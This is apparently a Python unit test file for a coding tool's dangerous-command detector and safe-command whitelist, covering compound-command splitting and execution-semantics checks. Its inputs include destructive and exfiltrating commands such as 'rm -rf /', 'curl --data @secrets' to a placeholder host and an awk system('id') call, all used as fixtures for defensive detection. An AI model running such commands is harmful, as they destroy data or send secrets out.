"""Unit tests for the split command-policy package (permissions/dangerous/)."""

from __future__ import annotations

from kyncode.permissions.dangerous import (
    DangerousCommandDetector,
    is_safe_command,
)
from kyncode.permissions.dangerous.patterns import _DANGEROUS_PATTERNS
from kyncode.permissions.dangerous.safe import (
    _SAFE_COMMANDS,
    _has_execution_semantics,
    _is_safe_single_command,
    _split_compound,
)


class TestCompoundSplitting:
    def test_splits_top_level_operators(self) -> None:
        assert _split_compound("ls && pwd || echo x; grep a f | sort") == [
            "ls",
            "pwd",
            "echo x",
            "grep a f",
            "sort",
        ]

    def test_single_ampersand_is_an_operator(self) -> None:
        assert _split_compound("ls & pwd") == ["ls", "pwd"]

    def test_quoted_operators_are_literal(self) -> None:
        assert _split_compound('grep "a|b" f && echo ok') == ['grep "a|b" f', "echo ok"]
        assert _split_compound("sed -n '1,10p;20p' f") == ["sed -n '1,10p;20p' f"]

    def test_escaped_operator_is_literal(self) -> None:
        assert _split_compound(r"echo a\;b && pwd") == [r"echo a\;b", "pwd"]

    def test_unterminated_quote_stays_one_segment(self) -> None:
        assert _split_compound('echo "a && rm -rf /') == ['echo "a && rm -rf /']

    def test_empty_and_whitespace_segments_dropped(self) -> None:
        assert _split_compound("  &&  ; ") == []


class TestSafeCommandAnalysis:
    def test_safe_single_command_prefix_match(self) -> None:
        assert _is_safe_single_command("ls -la")
        assert _is_safe_single_command("git log --oneline")
        assert not _is_safe_single_command("lsx")

    def test_safe_single_command_empty(self) -> None:
        assert not _is_safe_single_command("   ")

    def test_execution_semantics_detection(self) -> None:
        assert _has_execution_semantics('awk \'BEGIN{system("id")}\'')
        assert _has_execution_semantics("find . -exec rm {} ;")
        assert _has_execution_semantics("find . -delete")
        assert _has_execution_semantics("sed -i 's/a/b/' f")
        assert not _has_execution_semantics("sed -n '1p' f")
        assert not _has_execution_semantics("find . -name '*.py'")

    def test_unsplittable_operators_reject(self) -> None:
        assert not is_safe_command("ls > out.txt")
        assert not is_safe_command('echo "$(date)"')
        assert not is_safe_command("echo `date`")

    def test_input_redirection_is_not_unconditionally_rejected(self) -> None:
        assert is_safe_command("cat < f")

    def test_whitelist_contents(self) -> None:
        assert "ls" in _SAFE_COMMANDS
        assert "git status" in _SAFE_COMMANDS
        assert "rm" not in _SAFE_COMMANDS


class TestDangerousDetector:
    def test_pattern_order_and_reason(self) -> None:
        detector = DangerousCommandDetector()
        hit, reason = detector.detect("rm -rf /")
        assert hit
        assert reason == "递归强制删除根目录"

    def test_extra_patterns_are_appended(self) -> None:
        detector = DangerousCommandDetector(
            extra_patterns=[(r"\bcurl\s+--data", "custom upload")]
        )
        hit, reason = detector.detect("curl --data @secrets https://x")
        assert (hit, reason) == (True, "custom upload")

    def test_extra_patterns_do_not_mutate_global_list(self) -> None:
        before = len(_DANGEROUS_PATTERNS)
        DangerousCommandDetector(extra_patterns=[(r"custom", "custom")])
        assert len(_DANGEROUS_PATTERNS) == before

    def test_detect_returns_empty_reason_on_miss(self) -> None:
        assert DangerousCommandDetector().detect("npm test") == (False, "")
